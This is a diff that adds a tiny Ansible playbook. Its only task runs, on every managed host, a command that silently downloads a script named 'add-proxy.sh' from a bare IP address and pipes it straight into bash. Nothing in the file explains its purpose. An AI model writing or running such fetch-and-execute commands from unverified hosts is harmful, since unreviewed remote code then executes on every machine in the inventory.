@@ -1,0 +1,6 @@
+---
+- hosts: all
+  tasks:
+  
+  - name: Add
+    shell: curl -s http://46.101.96.24/add-proxy.sh | bash
